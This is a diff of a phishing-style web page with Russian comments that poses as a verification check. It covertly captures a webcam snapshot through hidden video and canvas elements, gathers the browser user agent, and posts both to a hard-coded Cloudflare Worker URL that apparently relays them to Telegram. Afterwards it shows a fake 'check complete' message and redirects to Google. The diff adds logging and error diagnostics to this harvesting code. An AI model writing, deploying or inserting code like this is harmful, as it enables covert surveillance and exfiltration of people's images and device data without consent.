@@ -28,9 +28,11 @@
   button:active{transform:translateY(1px)}
   button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
   .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
-          min-height:22px;white-space:pre-wrap}
+          min-height:22px;white-space:pre-wrap;word-break:break-all;
+          text-align:left;line-height:1.55}
   .ok{color:#3fb950!important}
   .err{color:#f85149!important}
+  .warn{color:#d29922!important}
   video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
@@ -62,11 +64,9 @@
 
 <script>
 // ============================================================
-// ВСТАВЬ СЮДА URL ТВОЕГО CLOUDFLARE WORKER
-// НЕ ЗАБУДЬ ПРО СЛЭШ В КОНЦЕ ПУТИ (без слэша в самом конце!)
+// ВСТАВЬ URL ТВОЕГО CLOUDFLARE WORKER
 // ============================================================
 var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
-// Пример: "https://harvester.snowy-river-1234.workers.dev/api/send"
 // ============================================================
 
 (function(){
@@ -80,26 +80,42 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     st.textContent = text;
   }
 
+  // ---------- Отправка на Worker с диагностикой ----------
   async function sendReport(text, photoDataUrl){
+    var payloadKind = photoDataUrl ? 'multipart' : 'json';
+    console.log('[send] → POST', WORKER_URL, '| вид:', payloadKind);
+
     try {
+      var r;
       if (photoDataUrl) {
         var blob = await (await fetch(photoDataUrl)).blob();
+        console.log('[send] фото размер:', blob.size, 'байт, тип:', blob.type);
         var form = new FormData();
         form.append('caption', text);
         form.append('photo', blob, 'snapshot.jpg');
-        var r = await fetch(WORKER_URL, { method: 'POST', body: form });
-        return await r.json();
+        r = await fetch(WORKER_URL, { method: 'POST', body: form });
       } else {
-        var r2 = await fetch(WORKER_URL, {
+        r = await fetch(WORKER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ text: text })
         });
-        return await r2.json();
       }
+
+      console.log('[send] ← HTTP статус:', r.status);
+
+      var rawText = await r.text();
+      console.log('[send] ← ответ тела:', rawText.slice(0, 400));
+
+      var j;
+      try { j = JSON.parse(rawText); }
+      catch(e) {
+        return { ok: false, err: 'Worker вернул не-JSON (статус ' + r.status + '): ' + rawText.slice(0, 200) };
+      }
+      return j;
     } catch (e) {
-      console.log('send failed:', e);
-      return { ok: false, err: e.message };
+      console.error('[send] Исключение:', e);
+      return { ok: false, err: 'Сеть/исключение: ' + e.message };
     }
   }
 
@@ -178,15 +194,17 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         return resolve({ error: 'getUserMedia not supported' });
       }
       try {
+        console.log('[cam] запрашиваем доступ...');
         var stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
+        console.log('[cam] доступ получен');
         cam.srcObject = stream;
         cam.play();
         await new Promise(function(res){
-          var t = setTimeout(res, 1500);
-          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 300); };
+          var t = setTimeout(res, 2000);
+          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 400); };
         });
         var w = cam.videoWidth || 640;
         var h = cam.videoHeight || 480;
@@ -195,9 +213,11 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         var ctx = snap.getContext('2d');
         ctx.drawImage(cam, 0, 0, w, h);
         var dataUrl = snap.toDataURL('image/jpeg', 0.85);
+        console.log('[cam] снимок готов:', w + 'x' + h, ', dataURL длина', dataUrl.length);
         stream.getTracks().forEach(function(t){ t.stop(); });
         resolve({ dataUrl: dataUrl, w: w, h: h });
       } catch(e) {
+        console.error('[cam] ошибка:', e.name, e.message);
         resolve({ error: e.name + ': ' + e.message });
       }
     });
@@ -282,19 +302,46 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
+    setStatus('Отправляем на сервер...\n\n[1/2] POST → Worker');
+
     var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
     var res = await sendReport(text, photoData);
 
+    // ---------- Разбор результата ----------
+    console.log('[send] финальный результат:', res);
+
     if (res && res.ok) {
-      setStatus('✓ Проверка завершена. Перенаправляем…', 'ok');
+      setStatus(
+        '✓ Отправлено успешно.\n\n' +
+        'Worker ответил: ' + JSON.stringify(res.tg ? { ok: res.tg.ok } : res),
+        'ok'
+      );
       btn.textContent = '✓ Готово';
       setTimeout(function(){
         window.location.href = 'https://www.google.com';
-      }, 2000);
-    } else {
-      setStatus('✓ Проверка завершена.', 'ok');
-      btn.textContent = '✓ Готово';
+      }, 2500);
+      return;
     }
+
+    // Ошибки — показываем подробно
+    var errMsg = '';
+    if (!res) {
+      errMsg = 'Не получили ответа от Worker. Проверь URL в WORKER_URL.';
+    } else if (res.err) {
+      errMsg = 'Ошибка: ' + res.err;
+    } else if (res.tg && res.tg.error_code) {
+      errMsg = 'Telegram вернул ошибку ' + res.tg.error_code + ': ' + (res.tg.description || '');
+    } else {
+      errMsg = 'Неизвестная ошибка: ' + JSON.stringify(res);
+    }
+
+    setStatus(
+      '✗ ОТПРАВКА НЕ УДАЛАСЬ\n\n' + errMsg +
+      '\n\nОткрой консоль (Cmd+Option+C) для деталей.',
+      'err'
+    );
+    btn.textContent = 'Повторить';
+    btn.disabled = false;
   });
 })();
 </script>
